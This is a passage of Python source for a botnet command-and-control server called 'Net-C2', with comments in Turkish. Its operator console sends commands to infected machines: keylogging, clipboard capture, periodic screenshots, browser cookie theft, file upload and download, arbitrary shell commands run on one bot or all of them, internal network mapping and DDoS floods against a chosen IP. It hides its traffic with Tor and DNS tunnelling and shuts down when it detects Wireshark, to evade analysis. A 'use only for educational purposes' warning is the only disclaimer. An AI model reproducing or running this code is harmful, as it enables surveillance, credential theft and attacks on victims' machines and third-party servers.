            if bot_id not in self.bots:
                return False
        
        if command in ["keylogger_start", "keylogger_stop", "clipboard_start", "clipboard_stop"]:
            self.command_queue.put({
                'bot_id': bot_id,
                'command': command,
                'action': 'execute',
                'silent': True  # Ana konsola çıktı yazılmayacak
            })
            return True
            
        # Legacy inline 'upload' handling removed. Use handle_command('upload ...') path only.
                
        # Eğer gelen komut tanımlı değilse, doğrudan bot'a gönder
        self.command_queue.put({
            'bot_id': bot_id,
            'command': command,
            'action': 'execute'
        })
        return True

    def broadcast_command(self, command):
        """Broadcast a command to all connected bots by enqueuing one task per bot."""
        try:
            with self.lock:
                target_bot_ids = list(self.bots.keys())
            for target_bot_id in target_bot_ids:
                self.command_queue.put({
                    'bot_id': target_bot_id,
                    'command': command,
                    'action': 'execute'
                })
            return True
        except Exception:
            return False

    def cleaner(self):
        while self.active:
            time.sleep(60)
            with self.lock:
                current_time = time.time()
                to_delete = []
                for bot_id, bot in self.bots.items():
                    if current_time - bot['last_seen'] > 300:
                        to_delete.append(bot_id)
                for bot_id in to_delete:
                    print(f"\033[93m[-] Bot timed out: {bot_id}\033[0m")
                    self.bots[bot_id]['conn'].close()
                    del self.bots[bot_id]

    def admin_console(self):
        while self.active:
            try:
                cmd = input("\033[1;36mNet-C2>\033[0m ").strip()
                
                # Komut geçmişine ekle
                self._add_to_history(cmd)
                
                if not cmd:
                    print()
                    continue
                
                # Help kontrolü - console loop için
                parts = cmd.split()
                if len(parts) >= 2 and parts[-1] == '?':
                    main_cmd = parts[0].lower()
                    # Tüm help sistemindeki komutları kontrol et
                    help_commands = ['cmd', 'upload', 'download', 'list', 'server', 'security', 'alerts', 
                               'processes', 'keylogger', 'clipboard', 'tor', 'dns_tunnel', 'web', 
                               'show', 'broadcast', 'clear', 'exit', 'help', 'network_map',
                               'cookies', 'copy', 'screenshot', 'sysinfo', 'isvm', 'whoami', 'pwd', 'ls', 'ss', 'ddos']
                    if main_cmd in help_commands:
                        self._show_command_help(main_cmd)
                        continue
                
                elif cmd == 'list':
                    with self.lock:
                        if not self.bots:
                            print("\033[93m[!] No active bots\033[0m")
                            continue
                            
                        print("\n\033[95mActive Bots:\033[0m")
                        for bot_id, bot in self.bots.items():
                            # Bot durumu bilgilerini al
                            p2p_status = self.p2p_status.get(bot_id, {}).get('status', 'unknown')
                            has_alert = bot_id in self.wireshark_alerts
                            
                            # Durum ikonları
                            p2p_icon = "🟢" if p2p_status == 'active' else "🔴" if p2p_status == 'stopped' else "⚪"
                            alert_icon = "⚠️" if has_alert else "✅"
                            
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mP2P Status:\033[0m {p2p_icon} {p2p_status}")
                            print(f"     \033[91mSecurity:\033[0m {alert_icon} {'Alert' if has_alert else 'Clean'}")
                            print()
                
                elif cmd == 'server':
                    print("\n\033[95mServer Information:\033[0m")
                    print(f"  \033[96m•\033[0m Host: \033[93m{self.host}\033[0m")
                    print(f"  \033[96m•\033[0m Port: \033[93m{self.port}\033[0m")
                    print(f"  \033[96m•\033[0m Encryption: \033[93mAES-256-CBC\033[0m")
                    print(f"  \033[96m•\033[0m Active Bots: \033[93m{len(self.bots)}\033[0m")
                    print(f"  \033[96m•\033[0m Uptime: \033[93m{time.ctime()}\033[0m")
                    print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
                    print(f"  \033[96m•\033[0m Security Rules: \033[93m{'Enabled' if self.security_rules_enabled else 'Disabled'}\033[0m")
                    print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
                    print(f"  \033[96m•\033[0m Data Folders:")
                    print(f"     - Cookies: \033[93m{'cookies/'}\033[0m")
                    print(f"     - Clipboard: \033[93m{'clipboard_data/'}\033[0m")
                    print(f"  \033[96m•\033[0m Command Queue: \033[93m{self.command_queue.qsize()} pending\033[0m")
                    print("\n\033[95mServer Status:\033[0m \033[92mACTIVE\033[0m\n")
                
                
                elif cmd == 'security':
                    print("\n\033[95mSecurity Rules Status:\033[0m")
                    print("  \033[96m•\033[0m Security Rules: \033[93m{'ENABLED' if self.security_rules_enabled else 'DISABLED'}\033[0m")
                    print("  \033[96m•\033[0m Rule #1: C2 Connected → P2P OFF")
                    print("  \033[96m•\033[0m Rule #2: Wireshark Detected → C2 + P2P OFF")
                    print("  \033[96m•\033[0m Rule #3: C2 Failed + No Wireshark → P2P ON")
                    
                    with self.lock:
                        active_alerts = len(self.wireshark_alerts)
                        active_p2p = len([s for s in self.p2p_status.values() if s['status'] == 'active'])
                    
                    print(f"  \033[96m•\033[0m Active Security Alerts: \033[93m{active_alerts}\033[0m")
                    print(f"  \033[96m•\033[0m Active P2P Networks: \033[93m{active_p2p}\033[0m")
                    print("\n\033[95mSecurity Status:\033[0m \033[92mPROTECTED\033[0m\n")
                
                elif cmd == 'p2p status':
                    print("\n\033[95mP2P Network Status:\033[0m")
                    
                    with self.lock:
                        if not self.p2p_status:
                            print("  \033[93m[!] No P2P activity detected\033[0m")
                        else:
                            for bot_id, status_info in self.p2p_status.items():
                                status = status_info['status']
                                timestamp = time.ctime(status_info['timestamp'])
                                color = "\033[92m" if status == 'active' else "\033[93m"
                                print(f"  {color}•\033[0m {bot_id}: {status} \033[90m({timestamp})\033[0m")
                    
                    print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
                    print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
                    print("\n\033[95mP2P Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'alerts':
                    print("\n\033[95mSecurity Alerts:\033[0m")
                    
                    with self.lock:
                        if not self.wireshark_alerts and not hasattr(self, 'security_alerts'):
                            print("  \033[92m[+] No security alerts\033[0m")
                        else:
                            # Wireshark uyarıları
                            if self.wireshark_alerts:
                                print("  \033[94m[*] Wireshark Alerts:\033[0m")
                                for bot_id, alert_info in self.wireshark_alerts.items():
                                    message = alert_info['message']
                                    timestamp = time.ctime(alert_info['timestamp'])
                                    print(f"    \033[91m•\033[0m {bot_id}: {message} \033[90m({timestamp})\033[0m")
                            
                            # Güvenlik uyarıları
                            if hasattr(self, 'security_alerts') and self.security_alerts:
                                print("  \033[94m[*] Security Alerts:\033[0m")
                                for bot_id, alert_info in self.security_alerts.items():
                                    target_ip = alert_info['target_ip']
                                    message = alert_info['message']
                                    attack_blocked = alert_info['attack_blocked']
                                    timestamp = time.ctime(alert_info['timestamp'])
                                    
                                    status_color = "\033[91m" if attack_blocked else "\033[93m"
                                    status_text = "BLOCKED" if attack_blocked else "WARNING"
                                    
                                    print(f"    {status_color}•\033[0m {bot_id} -> {target_ip}: {message} \033[90m({timestamp})\033[0m")
                                    print(f"      {status_color}Status: {status_text}\033[0m")
                    
                    print("\n\033[95mAlert Status:\033[0m \033[93mMONITORING\033[0m\n")
                
                elif cmd == 'web start':
                    if self.start_web_dashboard():
                        print("\033[92m[+] Web dashboard started successfully\033[0m")
                    else:
                        print("\033[91m[!] Failed to start web dashboard\033[0m")
                
                elif cmd == 'web stop':
                    if self.stop_web_dashboard():
                        print("\033[92m[+] Web dashboard stopped successfully\033[0m")
                    else:
                        print("\033[91m[!] Failed to stop web dashboard\033[0m")
                
                elif cmd == 'vuln status':
                    # Vulnerability Scanner : Disabled :(
                    print("\n\033[95mVulnerability Scanner Status:\033[0m")
                    print("  \033[96m•\033[0m Enabled: \033[93mNo\033[0m")
                    print("  \033[96m•\033[0m Sources: \033[93mExploitDB, PacketStorm, NVD, CVE Details, SecurityFocus (Disabled)\033[0m")
                    print("\n\033[95mVulnerability Scanner Status:\033[0m \033[94mDISABLED\033[0m\n")
                
                elif cmd == 'vuln summary':
                    # Vulnerability Summary : Disabled :(
                    print("\n\033[95mVulnerability Summary:\033[0m")
                    print("  \033[96m•\033[0m Status: \033[93mDisabled\033[0m (ExploitDB/PacketStorm/NVD/CVE Details/SecurityFocus)\n")
                
                
                elif cmd.startswith('processes '):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) < 2:
                        self._show_command_help('processes')
                        continue
                    bot_id = parts[1]
                    
                    # Bot'un var olup olmadığını kontrol et
                    with self.lock:
                        if bot_id not in self.bots:
                            print(f"\033[93m[!] Bot not found: {bot_id}\033[0m")
                            continue
                    
                    # Pending command'i işaretle
                    self._pending_processes_command = {'bot_id': bot_id}
                    
                    # Komutu gönder
                    result = self.send_command(bot_id, 'processes')
                    if result is False:
                        print(f"\033[93m[!] Failed to send command to bot: {bot_id}\033[0m")
                        self._pending_processes_command = None
                    else:
                        print(f"\033[94m[*] Requesting process information from {bot_id}...\033[0m")
                
                elif cmd == 'show exploits':
                    self._show_exploits()
                
                elif cmd == 'show stats':
                    self._show_stats()
                
                elif cmd == 'show logs':
                    self._show_logs()
                
                elif cmd == 'show config':
                    self._show_config()
                
                elif cmd == 'show history':
                    self._show_history()
                
                elif cmd == 'show files':
                    self._show_files()
                
                elif cmd == 'show network':
                    self._show_network()
                
                elif cmd == 'show':
                    self._show_help()
                
                elif cmd == 'web status':
                    print("\n\033[95mWeb Dashboard Status:\033[0m")
                    print(f"  \033[96m•\033[0m Status: \033[93m{'RUNNING' if self.web_dashboard_enabled else 'STOPPED'}\033[0m")
                    print(f"  \033[96m•\033[0m Host: \033[93m{self.web_dashboard_host}\033[0m")
                    print(f"  \033[96m•\033[0m Port: \033[93m{self.web_dashboard_port}\033[0m")
                    if self.web_dashboard_enabled:
                        print(f"  \033[96m•\033[0m URL: \033[93mhttp://{self.web_dashboard_host}:{self.web_dashboard_port}\033[0m")
                    print(f"  \033[96m•\033[0m Flask Available: \033[93m{'YES' if WEB_DASHBOARD_AVAILABLE else 'NO'}\033[0m")
                    print("\n\033[95mWeb Dashboard Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'help':
                    print("\n\033[95mAvailable Commands:\033[0m")
                    print("  \033[96m•\033[0m list       - Show Connected Bots")
                    print("  \033[96m•\033[0m cmd <ID> <command> - Send Command to Bot")
                    print("  \033[96m•\033[0m broadcast <command> - Send Command to All Bots")
                    print("  \033[96m•\033[0m upload <ID> <LPATH> - Upload File to Bot")
                    print("  \033[96m•\033[0m download <ID> <RPATH> - Download Files from Bot")
                    print("  \033[96m•\033[0m cookies <ID> - Steals Browser Cookies")
                    print("  \033[96m•\033[0m server       - Show Server Information")
                    print("  \033[96m•\033[0m tor help    - Show Tor c=Command Help")
                    print("  \033[96m•\033[0m tor enable  - Starting Tor Server")
                    print("  \033[96m•\033[0m tor disable - Stopping Tor Server")
                    print("  \033[96m•\033[0m tor renew   - Renew Tor Identity")
                    print("  \033[96m•\033[0m tor status  - Show Tor Status")
                    print("  \033[96m•\033[0m tor bots    - Show Tor Connected Bots")
                    print("  \033[96m•\033[0m clearnet bots - Show Clearnet Connected Bots")
                    print("  \033[96m•\033[0m clear      - Clear Console")
                    print("  \033[96m•\033[0m stop <ID> - Closes the Bot")
                    print("  \033[96m•\033[0m exit       - Shutdown Server")
                    print("  --------------------------------------------------------")
                    # AI/ML Commands : Disabled :(
                    print("  --------------------------------------------------------")
                    print("\033[95mSecurity & P2P Commands:\033[0m")
                    print("  \033[96m•\033[0m security   - Show Security Rules Status")
                    print("  \033[96m•\033[0m p2p status - Show P2P Network Status")
                    # AI-Powered P2P : Disabled :(
                    print("  \033[96m•\033[0m alerts     - Show Security Alerts")
                    print("  --------------------------------------------------------")
                    print("\033[95mWeb Dashboard Commands:\033[0m")
                    print("  \033[96m•\033[0m web start  - Start Web Dashboard")
                    print("  \033[96m•\033[0m web stop   - Stop Web Dashboard")
                    print("  \033[96m•\033[0m web status - Show Web Dashboard Status")
                    print("  \033[96m•\033[0m cmd <bot_id> <command> - Execute System Commands")
                    print("  \033[96m•\033[0m Example: cmd bot-123 whoami")
                    print("  \033[96m•\033[0m Example: cmd bot-123 isvm")
                    print("  \033[96m•\033[0m Example: cmd bot-123 pwd")
                    print("  \033[96m•\033[0m processes <bot_id> - Show Running Processes")
                    print("  --------------------------------------------------------")
                    print("\033[95mShow Commands:\033[0m")
                    print("  \033[96m•\033[0m show exploits - Show Comprehensive Exploit Database")
                    print("  \033[96m•\033[0m show stats - Show System Statistics")
                    print("  \033[96m•\033[0m show logs - Show System Logs")
                    print("  \033[96m•\033[0m show config - Show Server Configuration")
                    print("  \033[96m•\033[0m show history - Show Command History")
                    print("  \033[96m•\033[0m show files - Show File System Info")
                    print("  \033[96m•\033[0m show network - Show Network Information")
                    print("  \033[96m•\033[0m show - Show Help for Show Commands")
                    print("  --------------------------------------------------------")
                    print("\033[95mVulnerability Scanner Commands (Disabled):\033[0m")
                    print("  \033[96m•\033[0m vuln status   - Coming Soon...")
                    print("  \033[96m•\033[0m vuln summary  - Coming Soon...")
                    print("  --------------------------------------------------------")
                    print("\033[95mNetwork Mapping Commands:\033[0m")
                    print("  \033[96m•\033[0m network_map start <bot_id> [scope] - Start Network Mapping")
                    print("  \033[96m•\033[0m network_map status <bot_id> - Check Mapping Status")
                    print("  \033[96m•\033[0m network_map stop <bot_id> - Stop Network Mapping")
                    print("  \033[96m•\033[0m network_maps - Show All Network Maps")
                    print("  \033[96m•\033[0m Example: network_map start bot-123 192.168.1.0/24")
                    print("  \033[96m•\033[0m Example: network_maps")
                    print("  --------------------------------------------------------")
                    # Bypass Techniques : Disabled :(
                    print("\033[95mBypass Techniques:\033[0m")
                    print("  \033[91m•\033[0m Coming Soon...\033[0m")
                    print("  --------------------------------------------------------")
                    print("\033[95mPersistence Systems:\033[0m")
                    print("  \033[91m•\033[0m ? - Coming Soon...\033[0m")
                    print("  --------------------------------------------------------")
                    print("\033[95mSystem Copy Commands:\033[0m")
                    print("  \033[96m•\033[0m system_copy <bot_id> - DISABLED for safety")
                    print("  \033[96m•\033[0m copy_status <bot_id> - DISABLED for safety")
                    print("  \033[91m•\033[0m System replication disabled for safety")
                    print("  \033[91m•\033[0m Auto-copy functionality removed")
                
                elif cmd.startswith('cmd '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) < 3:
                        self._show_command_help('cmd')
                        continue
                        
                    bot_id = parts[1]
                    command = parts[2]
                    
                    if self.send_command(bot_id, command):
                        print(f"\033[92m[+] Command sent to {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot {bot_id} not found\033[0m")
                        
                elif cmd == 'tor enable':
                    if not self.tor_process:
                        if self.start_tor():
                            print("\033[92m[+] Tor service started successfully\033[0m")
                        else:
                            print("\033[91m[!] Failed to start Tor service\033[0m")
                    else:
                        print("\033[91m[!] Tor service is already running\033[0m")
                
                elif cmd == 'tor disable':
                    if self.tor_process:
                        if self.stop_tor():
                            print("\033[92m[+] Tor service stopped successfully\033[0m")
                        else:
                            print("\033[91m[!] Failed to stop Tor service\033[0m")
                    else:
                        print("\033[91m[!] Tor service is not running\033[0m")

                
                elif cmd == 'tor renew':
                    if self.tor_enabled:
                        self.renew_tor_identity()
                    else:
                        print("\033[91m[!] Tor modu aktif değil\033[0m")
                
                elif cmd == 'tor status':
                    print("\n\033[95mTor Status:\033[0m")
                    print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'YES' if self.tor_enabled else 'NO'}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Process: \033[93m{'RUNNING' if self.tor_process else 'STOPPED'}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
                    print(f"  \033[96m•\033[0m SOCKS5 Proxy: \033[93m{'AVAILABLE' if SOCKS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                    
                    # Tor proxy durumu
                    if self.tor_enabled and SOCKS_AVAILABLE:
                        print(f"  \033[96m•\033[0m Command Routing: \033[92mVIA TOR\033[0m")
                    elif self.tor_enabled and not SOCKS_AVAILABLE:
                        print(f"  \033[96m•\033[0m Command Routing: \033[91mCLEARNET (PySocks missing)\033[0m")
                    else:
                        print(f"  \033[96m•\033[0m Command Routing: \033[94mCLEARNET\033[0m")
                    
                    # Tor üzerinden bağlanan botları say
                    tor_bots = [bot_id for bot_id, bot in self.bots.items() 
                               if bot.get('tor_enabled', False)]
                    print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len(tor_bots)}\033[0m")
                    
                    if tor_bots:
                        print("  \033[96m•\033[0m Tor Bot List:")
                        for bot_id in tor_bots:
                            print(f"     - {bot_id}")
                    
                    if not SOCKS_AVAILABLE:
                        print(f"\n  \033[93m⚠️  Install PySocks for full Tor support: pip install PySocks\033[0m")
                    
                    print("\n\033[95mTor Status:\033[0m \033[94mMONITORING\033[0m\n")
                
                elif cmd == 'tor bots':
                    tor_bots = [bot_id for bot_id, bot in self.bots.items() 
                               if bot.get('tor_enabled', False)]
                    
                    if tor_bots:
                        print("\n\033[95mTor Connected Bots:\033[0m")
                        for bot_id in tor_bots:
                            bot = self.bots[bot_id]
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mPlatform:\033[0m {bot.get('platform', 'Unknown')}")
                            print()
                    else:
                        print("\033[93m[!] No Tor bots connected\033[0m")
                
                # DNS Tunneling komutları
                elif cmd.startswith('dns_tunnel '):
                    parts = cmd.split()
                    if len(parts) < 2:
                        self._show_command_help('dns_tunnel')
                    elif parts[1] == 'enable':
                        if len(parts) < 3:
                            print("\033[91m[!] Usage: dns_tunnel enable <domain>\033[0m")
                            print("\033[93m[*] Example: dns_tunnel enable c2domain.com\033[0m")
                        else:
                            domain = parts[2]
                            self.start_dns_tunnel(domain)
                    elif parts[1] == 'disable':
                        self.stop_dns_tunnel()
                    elif parts[1] == 'status':
                        print("\n\033[95mDNS Tunneling Status:\033[0m")
                        print(f"  \033[96m•\033[0m DNS Tunnel: \033[93m{'ENABLED' if self.dns_tunnel_enabled else 'DISABLED'}\033[0m")
                        print(f"  \033[96m•\033[0m Domain: \033[93m{self.dns_tunnel_domain if self.dns_tunnel_domain else 'Not set'}\033[0m")
                        print(f"  \033[96m•\033[0m Port: \033[93m{self.dns_port}\033[0m")
                        print(f"  \033[96m•\033[0m dnslib: \033[93m{'AVAILABLE' if DNS_AVAILABLE else 'NOT AVAILABLE'}\033[0m")
                        
                        # DNS Tunnel üzerinden bağlı botlar
                        dns_bots = [bot_id for bot_id, bot in self.bots.items() 
                                   if bot.get('dns_tunnel', False)]
                        print(f"  \033[96m•\033[0m DNS Tunnel Bots: \033[93m{len(dns_bots)}\033[0m")
                        
                        if dns_bots:
                            print("  \033[96m•\033[0m Bot List:")
                            for bot_id in dns_bots:
                                print(f"     - {bot_id}")
                        
                        if not DNS_AVAILABLE:
                            print(f"\n  \033[93m⚠️  Install dnslib: pip install dnslib\033[0m")
                        
                        print()
                    else:
                        self._show_command_help('dns_tunnel')
                
                elif cmd == 'clearnet bots':
                    clearnet_bots = [bot_id for bot_id, bot in self.bots.items() 
                                    if not bot.get('tor_enabled', False)]
                    
                    if clearnet_bots:
                        print("\n\033[95mClearnet Connected Bots:\033[0m")
                        for bot_id in clearnet_bots:
                            bot = self.bots[bot_id]
                            print(f"  \033[96m•\033[0m {bot_id} \033[90m({bot['ip']})\033[0m")
                            print(f"     \033[93mLast seen:\033[0m {time.ctime(bot['last_seen'])}")
                            print(f"     \033[94mPlatform:\033[0m {bot.get('platform', 'Unknown')}")
                            print()
                    else:
                        print("\033[93m[!] No clearnet bots connected\033[0m")
                
                elif cmd.startswith('ai target '):
                    target_ip = cmd.split()[2]
                    bot_id = cmd.split()[1]
                    
                    if self.send_command(bot_id, f"smart_target {target_ip}"):
                        print(f"\033[92m[+] Smart targeting başlatıldı: {bot_id} -> {target_ip}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                
                elif cmd.startswith('ai evasion '):
                    print("\033[91m[!] 'ai evasion' command is disabled for safety\033[0m")
                
                # AI/ML Commands : Disabled :(
                
                elif cmd.startswith('copy start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "clipboard_start"):
                        print(f"\033[92m[+] Clipboard logger başlatıldı: {bot_id}\033[0m")
                        clipboard_file = f"clipboard_data/copy_{bot_id.replace('/', '_').replace('\\', '_')}.txt"
                        try:
                            with open(clipboard_file, "w", encoding="utf-8") as f:
                                f.write(f"--- Clipboard logging started at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
                            print(f"\033[92m[+] Clipboard log dosyası hazırlandı: {clipboard_file}\033[0m")
                        except Exception as e:
                            print(f"\033[91m[!] Clipboard dosyası hazırlanamadı: {e}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                                
                
                elif cmd.startswith('copy stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "clipboard_stop"):
                        print(f"\033[92m[+] Clipboard logger durduruldu: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_start"):
                        print(f"\033[92m[+] Keylogger started: {bot_id}\033[0m")
                        print(f"\033[94m[*] Bot will connect to Kserver.py for keylogging\033[0m")
                        print(f"\033[93m[!] Make sure Kserver.py is running separately\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_stop"):
                        print(f"\033[92m[+] Keylogger stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ss start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ss_start"):
                        print(f"\033[92m[+] Screenshot started: {bot_id}\033[0m")
                        print(f"\033[94m[*] Screenshots will be saved to ScreenS/ folder\033[0m")
                        print(f"\033[93m[*] Capturing every 10 seconds\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ss stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ss_stop"):
                        print(f"\033[92m[+] Screenshot stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('ddos start '):
                    try:
                        parts = cmd.split()
                        if len(parts) < 4:
                            print(f"\033[91m[!] Usage: ddos start <bot_id> <target_ip> [--duration 30] [--threads 50]\033[0m")
                            continue
                        
                        bot_id = parts[2]
                        target_ip = parts[3]
                        
                        # Default values
                        duration = 30
                        threads = 50
                        
                        # Parse optional parameters
                        i = 4
                        while i < len(parts):
                            if parts[i] == '--duration' and i + 1 < len(parts):
                                duration = int(parts[i + 1])
                                i += 2
                            elif parts[i] == '--threads' and i + 1 < len(parts):
                                threads = int(parts[i + 1])
                                i += 2
                            else:
                                i += 1
                        
                        # Validate parameters
                        if duration > 300:
                            duration = 300
                            print(f"\033[93m[!] Duration limited to 300 seconds\033[0m")
                        
                        if threads > 100:
                            threads = 100
                            print(f"\033[93m[!] Threads limited to 100\033[0m")
                        
                        # Send command to bot
                        ddos_command = f"ddos_start|{target_ip}|80|{duration}|{threads}"
                        if self.send_command(bot_id, ddos_command):
                            print(f"\033[92m[+] DDoS attack started: {bot_id}\033[0m")
                            print(f"\033[94m[*] Target: {target_ip}:80\033[0m")
                            print(f"\033[94m[*] Duration: {duration} seconds\033[0m")
                            print(f"\033[94m[*] Threads: {threads}\033[0m")
                            print(f"\033[91m[!] WARNING: Use only for educational purposes!\033[0m")
                        else:
                            print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                            
                    except ValueError:
                        print(f"\033[91m[!] Invalid parameters. Use integers for duration and threads.\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] DDoS command error: {e}\033[0m")
                
                elif cmd.startswith('ddos stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "ddos_stop"):
                        print(f"\033[92m[+] DDoS attack stopped: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('cookies '):
                    bot_id = cmd.split(maxsplit=1)[1]
                    if self.send_command(bot_id, "get_cookies"):
                        print(f"\033[92m[+] Cookie talep gönderildi: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                    
                elif cmd.startswith('upload '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) != 3:
                        self._show_command_help('upload')
                        continue
                    bot_id = parts[1]
                    file_path = parts[2]
                    if not os.path.exists(file_path):
                        print(f"\033[91m[!] Dosya bulunamadı: {file_path}\033[0m")
                        continue
                    try:
                        with open(file_path, 'rb') as f:
                            file_bytes = f.read()
                        b64_data = base64.b64encode(file_bytes).decode('utf-8')
                        remote_name = os.path.basename(file_path)
                        self.command_queue.put({
                            'bot_id': bot_id,
                            'command': f"file_upload {remote_name} {b64_data}",
                            'action': 'file_upload',
                            'silent': True
                        })
                        print(f"\033[92m[+] Dosya yükleme komutu gönderildi: {bot_id}\033[0m")
                    except Exception as e:
                        print(f"\033[91m[!] Dosya okuma hatası: {e}\033[0m")
                
                elif cmd.startswith('download '):
                    parts = cmd.split(maxsplit=2)
                    if len(parts) != 3:
                        self._show_command_help('download')
                        continue
                    
                    bot_id = parts[1]
                    remote_path = parts[2]
                    
                    # Downloads dizini oluştur
                    downloads_dir = f"downloads/{bot_id}"
                    os.makedirs(downloads_dir, exist_ok=True)
                    
                    if self.send_command(bot_id, f"file_download {remote_path}"):
                        print(f"\033[92m[+] Dosya indirme komutu gönderildi: {bot_id}\033[0m")
                        print(f"\033[94m[*] Hedef dizin: {remote_path}\033[0m")
                        print(f"\033[94m[*] İndirilecek yer: {downloads_dir}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger start '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_start"):
                        print(f"\033[92m[+] Keylogger başlatıldı: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                
                elif cmd.startswith('keylogger stop '):
                    bot_id = cmd.split()[-1]
                    if self.send_command(bot_id, "keylogger_stop"):
                        print(f"\033[92m[+] Keylogger durduruldu: {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                
                elif cmd.startswith('network_map '):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        action = parts[1]
                        bot_id = parts[2]
                        
                        if action == 'start':
                            scope = parts[3] if len(parts) > 3 else '192.168.1.0/24'
                            if self.send_command(bot_id, f"network_map_start {scope}"):
                                print(f"\033[92m[+] Network mapping başlatıldı: {bot_id} - {scope}\033[0m")
                                print(f"\033[94m[*] Cihaz adı, MAC, IP ve servis bilgileri toplanıyor...\033[0m")
                            else:
                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                        
                        elif action == 'status':
                            if self.send_command(bot_id, "network_map_status"):
                                print(f"\033[92m[+] Network mapping durumu sorgulanıyor: {bot_id}\033[0m")
                            else:
                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                        
                        elif action == 'stop':
                            if self.send_command(bot_id, "network_map_stop"):
                                print(f"\033[92m[+] Network mapping durduruldu: {bot_id}\033[0m")
                            else:
                                print(f"\033[91m[!] Bot bulunamadı: {bot_id}\033[0m")
                        
                        else:
                            self._show_command_help('network_map')
                    else:
                        self._show_command_help('network_map')
                
                elif cmd == 'network_maps':
                    print("\n\033[95mNetwork Maps Status:\033[0m")
                    status = self.get_network_maps_status()
                    
                    if status['enabled']:
                        print(f"  \033[96m•\033[0m Network Mapping: \033[92mENABLED\033[0m")
                        print(f"  \033[96m•\033[0m Total Maps: \033[93m{status['total_maps']}\033[0m")
                        print(f"  \033[96m•\033[0m Storage Directory: \033[93m{self.network_maps_dir}/\033[0m")
                        
                        if status['maps']:
                            print("\n\033[95mAvailable Maps:\033[0m")
                            for bot_id, map_info in status['maps'].items():
                                timestamp = time.ctime(map_info['timestamp'])
                                scope = map_info['scope']
                                nodes = map_info['nodes_count']
                                links = map_info['links_count']
                                
                                print(f"  \033[96m•\033[0m {bot_id}")
                                print(f"     \033[93mScope:\033[0m {scope}")
                                print(f"     \033[93mDate:\033[0m {timestamp}")
                                print(f"     \033[93mDevices:\033[0m {nodes} nodes, {links} links")
                                print(f"     \033[93mFiles:\033[0m JSON, Mermaid, Markdown")
                                print()
                        else:
                            print("  \033[93m[!] No network maps available\033[0m")
                    else:
                        print("  \033[91m[!] Network mapping disabled\033[0m")
                    print()

                elif cmd.startswith('stop '):
                    bot_id = cmd.split(maxsplit=1)[1]
                    if self.send_command(bot_id, "stop"):
                        print(f"\033[92m[+] Stop command sent to {bot_id}\033[0m")
                    else:
                        print(f"\033[91m[!] Bot not found: {bot_id}\033[0m")
                
                elif cmd.startswith('broadcast '):
                    command = cmd.split(maxsplit=1)[1]
                    
                    if self.broadcast_command(command):
                        with self.lock:
                            count = len(self.bots)
                        print(f"\033[92m[+] Command broadcasted to {count} bots\033[0m")
                    else:
                        print("\033[91m[!] No active bots to broadcast\033[0m")
                
                elif cmd == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner()
                
                elif cmd.startswith('av_bypass '):
